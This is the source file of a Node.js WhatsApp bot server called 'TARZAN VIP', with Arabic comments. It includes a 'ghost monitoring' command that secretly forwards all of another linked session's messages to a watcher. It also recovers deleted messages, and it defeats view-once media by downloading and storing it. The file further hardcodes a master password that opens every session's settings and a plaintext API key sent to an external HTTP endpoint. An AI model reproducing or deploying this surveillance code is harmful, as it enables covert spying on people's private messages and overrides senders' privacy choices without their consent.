const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino'); // 🛡️ كتم السجلات لمنع اختناق المعالج
const { GoogleGenerativeAI } = require('@google/generative-ai');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys');

// 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot'; 
const sessions = {};
const msgStore = new Map(); 

// 👁️ خريطة الذاكرة لنظام المراقبة الشبحية
const activeMonitors = new Map();

// ✅ 1. نظام حفظ الإعدادات
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};
if (fs.existsSync(settingsPath)) { 
    botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); 
} else { 
    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
}

if (!botSettings.GLOBAL_CONFIG) {
    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
    saveSettings();
}

function saveSettings() { fs.writeFileSync(settingsPath, JSON.stringify(botSettings, null, 2)); }
function generateSessionPassword() { return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase(); }

// ✅ 2. مجلد الخزنة للميديا المخفية
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

// 🛡️ 3. نظام تفريغ الذاكرة الذكي
setInterval(() => { 
    if (msgStore.size > 5000) {
        msgStore.clear(); 
        console.log('🧹 [حماية السيرفر] تم تفريغ الذاكرة المؤقتة للرسائل');
    }
}, 30 * 60 * 1000);

app.use(express.static('public'));
app.use(express.json());

// ==========================================
// 🚀 4. معالج الأوامر
// ==========================================
const commandsMap = new Map();
const commandsPath = path.join(__dirname, 'commands');
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

function loadCommands() {
    commandsMap.clear();
    const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(`./commands/${file}`)];
            const command = require(`./commands/${file}`);
            if (command.name && command.execute) {
                commandsMap.set(command.name.toLowerCase(), command);
                if (command.aliases && Array.isArray(command.aliases)) {
                    command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                }
            }
        } catch (err) {}
    }
}
loadCommands();

// ==========================================
// ⚙️ 5. تشغيل الجلسات
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    if (!botSettings[sessionId]) {
        botSettings[sessionId] = { 
            password: generateSessionPassword(), 
            botEnabled: true, 
            commandsEnabled: true, 
            aiEnabled: false, 
            autoReact: false, 
            reactEmoji: '❤️', 
            welcomeSent: false,
            autoRead: false
        };
        saveSettings();
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        browser: ['Windows', 'Edge', '10.0'],
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false
    });

    sessions[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    if (pairingNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(pairingNumber);
                const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
                if (res && !res.headersSent) res.json({ pairingCode: formattedCode });
            } catch (err) {
                if (res && !res.headersSent) res.status(500).json({ error: 'تعذر طلب الكود. حاول بعد ثوانٍ.' });
            }
        }, 3000); 
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr && res && !pairingNumber && !res.headersSent) {
            try { const qrData = await qrCode.toDataURL(qr); res.json({ qr: qrData }); } catch(e){}
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) setTimeout(() => startSession(sessionId), 5000);
            else { delete sessions[sessionId]; fs.rmSync(sessionPath, { recursive: true, force: true }); }
        }

        if (connection === 'open') {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح!`);
            const selfId = jidNormalizedUser(sock.user.id);
            try { await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`); } catch (e) {}

            if (!botSettings[sessionId].welcomeSent) {
                const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك:*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
                await sock.sendMessage(selfId, { image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' }, caption: welcomeText });
                botSettings[sessionId].welcomeSent = true; saveSettings();
            }
        }
    });

    // ==========================================
    // 🛡️ 6. مضاد الحذف الجبار
    // ==========================================
    sock.ev.on('messages.update', async updates => {
        for (const { key, update } of updates) {
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) return; 
                    const selfId = jidNormalizedUser(sock.user.id);
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                    // تنظيف الرقم من الرموز باستخدام دالة jidNormalizedUser
                    const number = jidNormalizedUser(senderJid).split('@')[0]; 
                    const name = storedMsg.pushName || 'مجهول';
                    const time = moment().tz("Asia/Riyadh").format("hh:mm:ss A | YYYY-MM-DD");
                    
                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* wa.me/${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (err) {}
            }
        }
    });

    // ==========================================
    // 🔥 7. استقبال الرسائل المركزية والمراقبة
    // ==========================================
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const msg = messages[0];
        if (!msg?.message) return; 

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName || 'مجهول';
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;

        if (msgStore.size < 5000) msgStore.set(`${from}_${msg.key.id}`, msg);

        const currentSettings = botSettings[sessionId] || {};
        if (!currentSettings.botEnabled) return;

        // ميزة الصحين الزرقاء
        if (currentSettings.autoRead && !isFromMe) {
            try { await sock.readMessages([msg.key]); } catch (err) {}
        }

        let viewOnceIncoming = msg.message.viewOnceMessage || msg.message.viewOnceMessageV2 || msg.message.viewOnceMessageV2Extension;
        const mediaTypeCheck = Object.keys(msg.message)[0];
        if (msg.message[mediaTypeCheck]?.viewOnce === true) viewOnceIncoming = { message: msg.message };
        
        let body = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || '';

        const reply = async (text) => {
            await sock.sendPresenceUpdate('composing', from);
            return await sock.sendMessage(from, { text: text }, { quoted: msg });
        };

        // أوامر المراقبة
        if (body === '.صحين_زرقا') {
            botSettings[sessionId].autoRead = !botSettings[sessionId].autoRead;
            saveSettings();
            return reply(`✅ *تـم ${botSettings[sessionId].autoRead ? 'تـفـعـيـل' : 'إيـقـاف'} الـقـراءة الـتـلـقـائـيـة (الـصـحـيـن الـزرقـاء).*`);
        }

        if (body.startsWith('.مراقبه ')) {
            const targetSession = body.replace('.مراقبه ', '').trim();
            if (!sessions[targetSession]) return reply('❌ *عـذراً، هـذه الـجـلـسـة غـيـر مـتـصـلـة أو الاسـم خـاطـئ.*');
            if (targetSession === sessionId) return reply('❌ *لا يـمـكـنـك مـراقـبـة الـجـلـسـة الـتـي تـسـتـخـدمـهـا حـالـيـاً.*');

            activeMonitors.set(targetSession, { monitorJid: sender, monitorSocketId: sessionId });
            return reply(`✅ *تـم تـفـعـيـل الـمـراقـبـة بـنـجـاح.*\n👁️‍🗨️ الـهـدف: [ ${targetSession} ]`);
        }
        
        if (body === '.ايقاف_المراقبه') {
            for (let [key, val] of activeMonitors.entries()) {
                if (val.monitorJid === sender) activeMonitors.delete(key);
            }
            return reply('✅ *تـم إيـقـاف جـمـيـع عـمـلـيـات الـمـراقـبـة.*');
        }

        // ==========================================
        // 🚨 تنفيذ المراقبة الدقيقة جداً (SUPER VIP)
        // ==========================================
        if (activeMonitors.has(sessionId)) {
            const monitorInfo = activeMonitors.get(sessionId);
            const monitorSock = sessions[monitorInfo.monitorSocketId];

            if (monitorSock && from !== monitorInfo.monitorJid && sender !== monitorInfo.monitorJid) {
                try {
                    const time = moment().tz("Asia/Riyadh").format("YYYY-MM-DD | hh:mm:ss A");
                    
                    // 1. استخراج الأرقام الصافية 100% باستخدام jidNormalizedUser
                    const cleanSender = jidNormalizedUser(sender).split('@')[0];
                    const cleanFrom = jidNormalizedUser(from).split('@')[0];
                    const cleanSelf = jidNormalizedUser(selfId).split('@')[0];

                    // 2. تحديد الجهة واسم المجموعة
                    let chatLoc = "👤 درُدشـة خـاصـة";
                    if (isGroup) {
                        try {
                            const groupMetadata = await sock.groupMetadata(from);
                            chatLoc = `👥 مـجـمـوعـة: *${groupMetadata.subject}*`;
                        } catch (e) { chatLoc = `👥 مـجـمـوعـة`; }
                    }

                    // 3. فك تشفير الرسائل العميقة (عرض لمرة واحدة أو ذاتية الاختفاء)
                    let actualMessage = msg.message || {};
                    let isViewOnceMode = false;
                    let msgType = Object.keys(actualMessage)[0];

                    if (msgType === 'ephemeralMessage') {
                        actualMessage = actualMessage.ephemeralMessage.message;
                        msgType = Object.keys(actualMessage)[0];
                    }
                    if (['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'].includes(msgType)) {
                        actualMessage = actualMessage[msgType].message;
                        msgType = Object.keys(actualMessage)[0];
                        isViewOnceMode = true;
                    }
                    if (msgType === 'documentWithCaptionMessage') {
                        actualMessage = actualMessage.documentWithCaptionMessage.message;
                        msgType = Object.keys(actualMessage)[0];
                    }
                    if (msgType === 'senderKeyDistributionMessage' && Object.keys(actualMessage).length > 1) {
                        msgType = Object.keys(actualMessage)[1];
                    }

                    // 4. استخراج السياق (محولة / رد)
                    const contextInfo = actualMessage[msgType]?.contextInfo || {};
                    const isForwarded = contextInfo.isForwarded ? '✅ نـعـم' : '❌ لا';
                    let quotedTextContent = 'لا يـوجـد';
                    
                    if (contextInfo.quotedMessage) {
                        const qMsg = contextInfo.quotedMessage;
                        const qType = Object.keys(qMsg)[0];
                        quotedTextContent = qMsg.conversation || qMsg.extendedTextMessage?.text || qMsg.imageMessage?.caption || qMsg.videoMessage?.caption || `[ ${qType.replace('Message', '')} ]`;
                        if (quotedTextContent.length > 50) quotedTextContent = quotedTextContent.substring(0, 50) + '...';
                    }

                    // 5. استخراج النص أو وصف دقيق للمحتوى (لحل مشكلة "بدون نص")
                    let extractedText = actualMessage.conversation || 
                                        actualMessage.extendedTextMessage?.text || 
                                        actualMessage.imageMessage?.caption || 
                                        actualMessage.videoMessage?.caption || 
                                        actualMessage.documentMessage?.caption || 
                                        "";

                    let contentDesc = "📝 نص";
                    const typeMap = {
                        'imageMessage': '📷 صـورة',
                        'videoMessage': '🎥 فـيـديـو',
                        'audioMessage': '🎵 مـقـطـع صـوتـي (فويس)',
                        'documentMessage': '📄 مـلـف / مـسـتـنـد',
                        'stickerMessage': '🌠 مـلـصـق (ستيكر)',
                        'contactMessage': '👤 كـرت جـهـة اتـصـال',
                        'locationMessage': '📍 مـوقـع جـغـرافـي',
                        'pollCreationMessage': '📊 تـصـويـت / اسـتـطـلاع',
                        'conversation': '📝 نـص',
                        'extendedTextMessage': '📝 نـص'
                    };

                    if (typeMap[msgType]) contentDesc = typeMap[msgType];
                    if (isViewOnceMode) contentDesc = '👁️‍🗨️ عـرض لـمـرة واحـدة (' + contentDesc + ')';

                    // إذا لم يكن هناك نص صريح، نستخرج الوصف من نوع الرسالة
                    if (!extractedText.trim()) {
                        if (msgType === 'contactMessage') {
                            extractedText = `[ كرت جهة اتصال باسم: ${actualMessage.contactMessage?.displayName || 'غير معروف'} ]`;
                        } else if (msgType === 'pollCreationMessage') {
                            extractedText = `[ تصويت: ${actualMessage.pollCreationMessage?.name || 'غير معروف'} ]`;
                        } else if (msgType === 'locationMessage') {
                            extractedText = `[ موقع جغرافي تمت مشاركته ]`;
                        } else if (msgType === 'stickerMessage') {
                            extractedText = `[ ملصق / ستيكر ]`;
                        } else if (msgType === 'audioMessage') {
                            extractedText = `[ مقطع صوتي / فويس ]`;
                        } else {
                            extractedText = "بدون نص";
                        }
                    }

                    // 6. اتجاه الرسالة
                    let directionTitle = isFromMe ? '📤 *[ صـادر مـن هـاتـفـك ]*' : '📥 *[ وارد إلـى هـاتـفـك ]*';
                    
                    // تحديد الرقم المستهدف للتقرير
                    let reportNumber = isFromMe ? cleanFrom : cleanSender;

                    // 7. صياغة التقرير بالتنسيق المطلوب حرفياً
                    const reportText = `👑 *نـظـام الـمـراقـبـة الجبار SUPER VIP* 👑\n` +
                                       `━━━━━━━━━━━━━━━━━━\n` +
                                       `${directionTitle}\n\n` +
                                       `👤 *الاسـم:* ${isFromMe ? 'أنت' : pushName}\n` +
                                       `📱 *الـرقم الحقيقي:* wa.me/${reportNumber}\n` +
                                       `📍 *الـجـهـة:* ${chatLoc}\n` +
                                       `🕒 *الـوقـت:* ${time}\n\n` +
                                       `📌 *سـيـاق الـرسـالـة:*\n` +
                                       `↪️ *رسـالـة مـحـولـة:* ${isForwarded}\n` +
                                       `🗣️ *رد عـلـى:* ${quotedTextContent}\n\n` +
                                       `📂 *نـوع الـرسـالـة:* ${contentDesc}\n` +
                                       `📝 *الـمـحـتـوى:*\n${extractedText}\n` +
                                       `━━━━━━━━━━━━━━━━━━\n` +
                                       `🔍 *الـمـعـرف:* ${sessionId}`;

                    await monitorSock.sendMessage(monitorInfo.monitorJid, { text: reportText });

                    // 8. تحويل الرسالة فعلياً (كسر العرض لمرة واحدة أو تحويل عادي)
                    if (isViewOnceMode) {
                        try {
                            // تنزيل الميديا المخفية وتحويلها لرسالة عادية
                            const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                            if (msgType === 'imageMessage') {
                                await monitorSock.sendMessage(monitorInfo.monitorJid, { image: buffer, caption: "📸 *[تم فك تشفير العرض لمرة واحدة]*" });
                            } else if (msgType === 'videoMessage') {
                                await monitorSock.sendMessage(monitorInfo.monitorJid, { video: buffer, caption: "🎥 *[تم فك تشفير العرض لمرة واحدة]*" });
                            } else if (msgType === 'audioMessage') {
                                await monitorSock.sendMessage(monitorInfo.monitorJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
                            }
                        } catch (err) {
                            await monitorSock.sendMessage(monitorInfo.monitorJid, { text: "❌ *تنبيه:* فشل سحب العرض لمرة واحدة بسبب تشفيرات واتساب المعقدة." });
                        }
                    } else {
                        // تحويل كل شيء آخر (جهات اتصال، ملصقات، ملفات)
                        await monitorSock.sendMessage(monitorInfo.monitorJid, { forward: msg });
                    }
                } catch (e) {
                    console.error('❌ خطأ في نظام المراقبة:', e.message);
                }
            }
        }

        // ==========================================
        // 👁️‍🗨️ الرادار: صائد العرض لمرة واحدة (الخزنة العامة)
        // ==========================================
        if (viewOnceIncoming && !isFromMe) {
            try {
                const actualMessage = viewOnceIncoming.message;
                const mediaType = Object.keys(actualMessage)[0];
                const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });

                const ext = mediaType === 'imageMessage' ? 'jpg' : (mediaType === 'videoMessage' ? 'mp4' : 'ogg');
                const fileName = `VO_${jidNormalizedUser(sender).split('@')[0]}_${Date.now()}.${ext}`;
                fs.writeFileSync(path.join(vaultPath, fileName), buffer);

                const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${jidNormalizedUser(sender).split('@')[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
                
                if (mediaType === 'imageMessage') await sock.sendMessage(selfId, { image: buffer, caption: reportTxt });
                else if (mediaType === 'videoMessage') await sock.sendMessage(selfId, { video: buffer, caption: reportTxt });
                else if (mediaType === 'audioMessage') await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
            } catch (err) { console.error('❌ خطأ في الرادار التلقائي:', err); }
        }

        if (currentSettings.autoReact && !isFromMe && !viewOnceIncoming) {
            try { await sock.sendMessage(from, { react: { text: currentSettings.reactEmoji || '❤️', key: msg.key } }); } catch(e) {}
        }

        // ==========================================
        // 🧠 8. الذكاء الاصطناعي
        // ==========================================
        const isCmd = body.startsWith('.');
        if (currentSettings.aiEnabled && !isCmd && !isFromMe && body.trim() !== '' && !viewOnceIncoming) {
            try {
                await sock.sendPresenceUpdate('composing', from); 
                const query = body.trim();
                const API_KEY = 'AI_1d21219cc3914971'; 
                const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat';

                const response = await axios.post(API_URL, { api_key: API_KEY, prompt: query }, { headers: { 'Content-Type': 'application/json' }, timeout: 25000 });
                if (response.data && response.data.status === 'success') {
                    await reply(response.data.response);
                }
            } catch (error) {}
            return; 
        }

        // ==========================================
        // 🎯 9. معالجة الأوامر الخارجية
        // ==========================================
        if (!currentSettings.commandsEnabled) return;

        let selectedId = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '';
        let commandName = '';
        let args = [];
        let textArgs = '';

        if (selectedId) {
            commandName = selectedId.toLowerCase();
        } else if (isCmd) {
            args = body.slice(1).trim().split(/ +/);
            commandName = args.shift().toLowerCase();
            textArgs = args.join(' ');
        }

        if (!commandName) return;

        const commandData = commandsMap.get(commandName);

        if (commandData) {
            try {
                if (commandName !== '🌚' && commandName !== 'vv') {
                    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
                }
                
                await commandData.execute({
                    sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix: '.', commandName, sessions, botSettings, saveSettings
                });
            } catch (error) {
                console.error(`❌ خطأ في الأمر ${commandName}:`, error);
                if (commandName !== '🌚' && commandName !== 'vv') {
                    await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
                }
            }
        }
    });

    return sock;
}

// ==========================================
// 🌐 10. API Endpoints (لوحة التحكم)
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    let formattedNumber = number.replace(/[^0-9]/g, '');
    
    if (sessions[sessionId] || fs.existsSync(path.join(__dirname, 'sessions', sessionId))) {
        if(sessions[sessionId]) sessions[sessionId].logout();
        delete sessions[sessionId];
        fs.rmSync(path.join(__dirname, 'sessions', sessionId), { recursive: true, force: true });
    }
    startSession(sessionId, res, formattedNumber);
});

app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    res.json(settings);
});

app.post('/api/settings/save', (req, res) => {
    const { sessionId, password, botEnabled, commandsEnabled, aiEnabled, autoReact, reactEmoji, autoRead } = req.body;
    const settings = botSettings[sessionId];
    if (!settings) return res.status(404).json({ error: 'الجلسة غير موجودة' });
    if (settings.password !== password && password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    
    botSettings[sessionId].botEnabled = !!botEnabled;
    botSettings[sessionId].commandsEnabled = !!commandsEnabled;
    botSettings[sessionId].aiEnabled = !!aiEnabled; 
    botSettings[sessionId].autoReact = !!autoReact;
    botSettings[sessionId].reactEmoji = reactEmoji || '❤️';
    if(autoRead !== undefined) botSettings[sessionId].autoRead = !!autoRead; 
    saveSettings();
    res.json({ success: true, message: '✅ تم حفظ التعديلات' });
});

app.get('/sessions', (req, res) => { res.json({ count: Object.keys(sessions).length, sessions: Object.keys(sessions) }); });

app.post('/delete-session', (req, res) => {
    const { sessionId, password } = req.body;
    if (password !== MASTER_PASSWORD) return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    if (sessions[sessionId]) { sessions[sessionId].logout(); delete sessions[sessionId]; }
    if (botSettings[sessionId]) { delete botSettings[sessionId]; saveSettings(); }
    if (fs.existsSync(sessionPath)) { fs.rmSync(sessionPath, { recursive: true, force: true }); res.json({ message: `تم حذف ${sessionId}` }); } 
    else { res.status(404).json({ error: 'الجلسة غير موجودة' }); }
});

app.listen(PORT, () => {
    console.log(`\n=========================================`);
    console.log(`🚀 سيرفر TARZAN VIP يعمل بقوة على منفذ ${PORT}`);
    console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
    console.log(`✨ تم إصلاح الأرقام الوهمية وفك العرض لمرة واحدة بنجاح`);
    console.log(`=========================================\n`);
});
